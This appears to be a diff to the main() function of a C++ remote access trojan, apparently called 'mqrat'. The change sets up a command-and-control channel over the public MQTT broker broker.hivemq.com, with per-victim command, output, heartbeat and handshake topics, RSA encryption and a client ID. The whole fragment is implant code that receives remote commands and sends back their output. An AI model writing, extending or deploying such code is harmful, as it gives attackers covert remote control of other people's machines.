@@ -31,15 +31,20 @@ int main() {
 	string topic_name = "mqrat/cmd/";
 	unsigned QoS = 0;
 	MqttClient *client = nullptr;
-	Crypto::RSACipher *cipher = new Crypto::RSACipher();
+	Crypto::RSACipher *cipher = nullptr;
+
+	signal(SIGSEGV, sigsegv_handler);
+
+	cipher = new Crypto::RSACipher();
 
 	if(!cipher) {
 		Log::LogPanic("Failed to allocate memory for RSA Cipher object");
 	}
 
-	signal(SIGSEGV, sigsegv_handler);
+	// Generate MQTT client ID
+	const auto id = Utils::GenerateID();
 
-	client = new MqttClient(QoS, "tcp://broker.hivemq.com:1883", cipher);
+	client = new MqttClient(QoS, "tcp://broker.hivemq.com:1883", cipher, id);
 	if(!client) {
 		Log::LogPanic("Failed to initialize MQTT client");
 	}
@@ -48,7 +53,7 @@ int main() {
     client->Setup();
 
 	// Generate send and receive topic
-	auto heartbeat_topic = topic_name + Utils::GenerateID();
+	auto heartbeat_topic = topic_name + id;
 	auto recv_topic = heartbeat_topic + "/command";
 	auto send_topic = heartbeat_topic + "/output";
 	auto handshake_topic = heartbeat_topic + "/hs";
@@ -58,19 +63,30 @@ int main() {
 	client->setHeartbeatTopic(heartbeat_topic);
 	client->setHandshakeTopic(handshake_topic);
 
+	Log::LogInfo("Handshake topic: " + handshake_topic);
+	Log::LogInfo("Heartbeat topic: " + heartbeat_topic);
+	Log::LogInfo("Send topic: " + send_topic);
+	Log::LogInfo("Recv topic: " + recv_topic);
+
 	// Connect to broker
 	client->Connect();
 
-	// Subscribe to topic where command will be received
-	client->Subscribe(recv_topic);
-	client->Subscribe(handshake_topic);
+	// Subscribe to multiple topics
+	auto hs_topic = const_cast<char*>(handshake_topic.c_str());
+	auto rc_topic = const_cast<char*>(recv_topic.c_str());
+	char *const tps[] = { hs_topic, rc_topic };
+	char *const *topics = tps;
+	int qos[2] = { 0, 0 };
+
+	printf("[INFO] Subscribing to %d topics\n", arraySize(qos));
+
+	client->Subscribe(topics, qos, arraySize(qos));
 
 	// Internal loop
 	std::thread mqtt_thread(&MqttClient::Loop, client);
-
 	Log::LogInfo("Started MQTT client thread");
-	if(mqtt_thread.joinable())
-		mqtt_thread.join();
+
+	mqtt_thread.join();
 
 	// Free resources
 	delete cipher;
